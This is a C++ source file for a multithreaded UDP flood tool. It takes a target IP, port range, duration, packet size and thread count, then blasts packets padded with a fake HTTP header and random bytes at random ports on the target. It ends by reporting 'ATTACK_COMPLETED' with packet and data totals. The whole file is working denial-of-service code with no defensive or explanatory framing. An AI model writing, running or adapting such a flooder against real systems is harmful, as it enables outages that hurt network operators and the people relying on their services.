#include <iostream>
#include <thread>
#include <vector>
#include <string>
#include <cstring>
#include <chrono>
#include <mutex>
#include <random>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <unistd.h>

#define MAX_PACKET_SIZE 65507
#define FAKE_ERROR_DELAY 20
#define MIN_PACKET_SIZE 1

bool keepSending = true;
long long totalPacketsSent = 0;
long long totalSendFailures = 0;
long long totalSendAttempts = 0;
double totalDataMB = 0.0;
std::mutex statsMutex;

void packetSender(int threadId, const std::string& targetIp, int baseTargetPort, int durationSeconds, int packetSize, int numThreads) {
    int udpSocket;
    struct sockaddr_in serverAddr;
    char* packet = new char[packetSize];
    std::srand(threadId + time(nullptr));

    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket < 0) {
        std::cerr << "Thread " << threadId << ": Socket creation failed, errno: " << errno << "\n";
        delete[] packet;
        return;
    }

    int flags = fcntl(udpSocket, F_GETFL, 0);
    fcntl(udpSocket, F_SETFL, flags | O_NONBLOCK);

    struct sockaddr_in localAddr;
    localAddr.sin_family = AF_INET;
    localAddr.sin_addr.s_addr = INADDR_ANY;
    localAddr.sin_port = 0;
    if (bind(udpSocket, (struct sockaddr*)&localAddr, sizeof(localAddr)) < 0) {
        std::cerr << "Thread " << threadId << ": Bind failed, errno: " << errno << "\n";
        close(udpSocket);
        delete[] packet;
        return;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(targetIp.c_str());

    std::string fakeHeader = "GET /?id=" + std::to_string(rand() % 9999) + " HTTP/1.1\r\nHost: " + targetIp + "\r\n";
    int headerLen = std::min((int)fakeHeader.length(), packetSize);
    std::memcpy(packet, fakeHeader.c_str(), headerLen);
    for (int i = headerLen; i < packetSize - 1; i++) {
        packet[i] = rand() % 256;
    }
    packet[packetSize - 1] = '\0';

    long long threadPackets = 0;
    long long threadFailures = 0;
    long long totalAttempts = 0;
    double threadDataMB = 0.0;
    auto startTime = std::chrono::steady_clock::now();

    while (keepSending) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - startTime).count();
        if (elapsed >= durationSeconds) break;

        int targetPort = baseTargetPort + (rand() % 2000);
        serverAddr.sin_port = htons(targetPort);

        int burstSize = 2;
        int successfulSends = 0;
        int maxRetries = 5;
        for (int burst = 0; burst < burstSize && keepSending; burst++) {
            int retries = 0;
            while (retries < maxRetries) {
                totalAttempts++;
                ssize_t bytesSent = sendto(udpSocket, packet, packetSize, 0,
                                         (struct sockaddr*)&serverAddr, sizeof(serverAddr));
                if (bytesSent > 0) {
                    threadPackets++;
                    threadDataMB += static_cast<double>(bytesSent) / (1024.0 * 1024.0);
                    successfulSends++;
                    break;
                } else if (bytesSent < 0) {
                    retries++;
                    std::cerr << "Thread " << threadId << ": Send failed, retry " << retries << ", errno: " << errno << "\n";
                    if (retries == maxRetries) {
                        threadFailures++;
                        break;
                    }
                    std::this_thread::sleep_for(std::chrono::milliseconds(20));
                }
            }
        }
        totalPacketsSent += successfulSends;
    }

    {
        std::lock_guard<std::mutex> lock(statsMutex);
        totalSendFailures += threadFailures;
        totalDataMB += threadDataMB;
        totalSendAttempts += totalAttempts;
    }

    close(udpSocket);
    delete[] packet;
}

void countdown(int duration) {
    for (int i = duration; i > 0 && keepSending; --i) {
        std::cout << "\rTime Left: " << i << " seconds" << std::flush;
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    std::cout << "\rTime Left: 0 seconds" << std::endl;
    keepSending = false;
}

int main(int argc, char* argv[]) {
    if (argc != 6) {
        std::cerr << "Usage: " << argv[0] << " <ip> <port> <time> <packet_size> <threads>\n";
        return 1;
    }

    std::string targetIp = argv[1];
    int baseTargetPort;
    int durationSeconds;
    int packetSize;
    int numThreads;

    try {
        baseTargetPort = std::stoi(argv[2]);
        durationSeconds = std::stoi(argv[3]);
        packetSize = std::stoi(argv[4]);
        numThreads = std::stoi(argv[5]);
    } catch (const std::exception& e) {
        std::cerr << "Invalid argument format\n";
        return 1;
    }

    if (packetSize < MIN_PACKET_SIZE) {
        std::cerr << "Packet size must be at least " << MIN_PACKET_SIZE << "\n";
        return 1;
    }
    if (numThreads < 1) {
        std::cerr << "Threads must be at least 1\n";
        return 1;
    }

    std::vector<std::thread> threads;
    for (int i = 0; i < numThreads; i++) {
        threads.emplace_back(packetSender, i, targetIp, baseTargetPort, durationSeconds, packetSize, numThreads);
    }

    countdown(durationSeconds);

    for (auto& thread : threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }

    double failureRate = totalSendAttempts > 0 ? (static_cast<double>(totalSendFailures) / totalSendAttempts) * 100.0 : 0.0;
    std::cout << "ATTACK_COMPLETED\n";
    std::cout << "FAILURE_RATE:" << failureRate << "\n";
    std::cout << "TOTAL_PACKETS_SENT:" << totalPacketsSent << "\n";
    std::cout << "TOTAL_DATA_MB:" << totalDataMB << "\n";

    return 0;
}